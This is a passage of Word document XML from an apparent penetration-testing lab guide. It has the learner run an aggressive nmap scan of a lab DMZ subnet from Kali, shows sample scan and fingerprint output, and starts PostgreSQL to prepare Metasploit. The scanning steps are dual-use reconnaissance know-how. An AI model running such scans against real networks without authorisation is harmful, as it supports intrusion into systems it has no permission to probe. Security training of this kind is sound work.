        <w:r w:rsidRPr="00C05730">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.fing.io/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>) which runs on your Smartphone!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7EFDD0" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="005D73A7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="01DC0D47" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="005D73A7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Before starting an attack, a hacker will probe for applications running within the network.  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is a freeware tool which can be used to probe a subnet or a specific IP address to ports as well as attempt to classify what the application on the port is.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F601E1" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="005D73A7">
      <w:pPr>
        <w:pStyle w:val="Note"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Execute </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> against the DMZ network to see if there are any ‘interesting’ computers we can </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>see..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">  From the ssh connection to the Kali </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> server, run the following command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B31193" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="005D73A7">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C72990">
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C72990">
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C72990">
        <w:t>Pn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C72990">
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C72990">
        <w:t>sS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C72990">
        <w:t xml:space="preserve"> -A -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C72990">
        <w:t>oX</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C72990">
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C72990">
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C72990">
        <w:t>/nmap.xml 10.1.10.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B5F01F" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00EB7C80" w:rsidRDefault="005D73A7" w:rsidP="005D73A7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>This will initiate a scan which should take up to 10 minutes to complete.  The output will be stored in an XML file that we will import into Metasploit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC9A62E" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="005D73A7">
      <w:pPr>
        <w:pStyle w:val="TableGraphtitle"/>
      </w:pPr>
      <w:r>
        <w:t>Sample Output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F93983" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">Starting Nmap 6.49BETA4 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>( https://nmap.org</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> ) at 2017-06-26 14:32 EDT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51200160" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Nmap scan report for 10.1.10.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E18EDA" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Host is up (0.0015s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F321CE9" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>All 1000 scanned ports on 10.1.10.1 are filtered</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="108BD6B6" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>MAC Address: 2C:C2:</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>60:FF</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>:00:01 (Ravello Systems)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB8C335" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Too many fingerprints match this host to give specific OS details</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E259FD8" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Network Distance: 1 hop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14720846" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75B420FF" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>TRACEROUTE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A62BFFD" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>HOP RTT     ADDRESS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596C0F5F" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">1   1.47 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>ms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> 10.1.10.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21968DC6" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27C9ABBD" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Nmap scan report for 10.1.10.14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECE3E15" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Host is up (0.0012s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4930B652" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Not shown: 999 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCF4A05" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>PORT   STATE SERVICE VERSION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675780AC" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>80/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>open  http</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F04531" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">MAC Address: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>2C:C2:60:4</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>E:15:D2 (Ravello Systems)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769B2231" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">No exact OS matches for host (If you know what OS is running on it, see </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>https://nmap.org/submit/ )</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="387BB740" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>TCP/IP fingerprint:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D31D90E" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>OS:SCAN</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>(V=6.49BETA4%E=4%D=6/26%OT=80%CT=1%CU=31425%PV=Y%DS=1%DC=D%G=Y%M=2CC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C60E0DF" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>OS:260%TM=5951553A%P=x86_64-pc-linux-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>gnu)SEQ</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>(SP=FC%GCD=1%ISR=10D%TI=RD%CI=R</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9FD5B5" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>OS:I</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>%TS=A)OPS(O1=M5B4NNT11SLL%O2=M5B4NNT11SLL%O3=M5B4NNT11%O4=M5B4NNT11SLL%</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD63CA0" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>OS:O</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>5=M5B4NNT11SLL%O6=M5B4NNT11SLL)WIN(W1=111C%W2=1068%W3=780%W4=648%W5=648</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE07EA0" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>OS:%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>W6=31B)ECN(R=Y%DF=Y%T=FF%W=111C%O=M5B4SLL%CC=N%Q=)T1(R=Y%DF=Y%T=FF%S=O%</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556671F4" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>OS:A</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=S%F=AR%O=%RD=</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562E6F76" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>OS:0%Q</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>=)T</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>5(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E76E931" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>OS:S=A%A=S%F=AR%O=%RD=0%Q</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>=)T</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>7(R=N)U1(R=Y%DF=Y%T=FF%IPL=38%UN=0%RIPL=G%RID=G</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DCE926" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>OS:%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:t>RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=Y%T=FF%CD=S)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE9234F" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DFC52A3" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="005D73A7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:b/>
          <w:i/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B13D41">
        <w:rPr>
          <w:b/>
          <w:i/>
        </w:rPr>
        <w:t>… snip …</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73FAEEE2" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t xml:space="preserve">OS and Service detection performed. Please report any incorrect results at </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00526315">
        <w:t>https://nmap.org/submit/ .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="7CAB52BA" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRPr="00526315" w:rsidRDefault="005D73A7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Nmap done: 256 IP addresses (18 hosts up) scanned in 515.89 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5391A8DF" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="005D73A7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02B294CF" w14:textId="2D9754A1" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Open a New ssh session to the Kali server while the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> command runs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26147587" w14:textId="7C3A48B0" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Metasploit uses a database to store many of the items you’ll be using as well as the data from searches such as the one running in your </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> session.  To ensure that the database is running</w:t>
      </w:r>
      <w:r w:rsidR="008245A4">
        <w:t>, run the following from the command line:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63039301" w14:textId="64081E3F" w:rsidR="008245A4" w:rsidRDefault="008245A4" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r w:rsidRPr="008245A4">
        <w:t xml:space="preserve">service </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008245A4">
        <w:t>postgresql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008245A4">
        <w:t xml:space="preserve"> start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267D36CC" w14:textId="430EF033" w:rsidR="008245A4" w:rsidRDefault="008245A4">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will ensure that </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>postgresql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is running.  You can also check the status:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F21BB1B" w14:textId="30116D0A" w:rsidR="008245A4" w:rsidRDefault="008245A4" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r w:rsidRPr="008245A4">
        <w:t xml:space="preserve">service </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008245A4">
        <w:t>postgresql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008245A4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67554709" w14:textId="77777777" w:rsidR="008245A4" w:rsidRDefault="008245A4" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">● </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>postgresql.service</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> - PostgreSQL RDBMS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9322F9" w14:textId="77777777" w:rsidR="008245A4" w:rsidRDefault="008245A4" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   Loaded: loaded (/lib/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>systemd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/system/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>postgresql.service</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; enabled)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B18A38" w14:textId="77777777" w:rsidR="008245A4" w:rsidRDefault="008245A4" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   Active: active (exited) since Tue 2017-07-04 10:59:07 EDT; 31min ago</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56103F10" w14:textId="77777777" w:rsidR="008245A4" w:rsidRDefault="008245A4" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  Process: 779 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ExecStart</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=/bin/true (code=exited, status=0/SUCCESS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="485035E8" w14:textId="77777777" w:rsidR="008245A4" w:rsidRDefault="008245A4" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
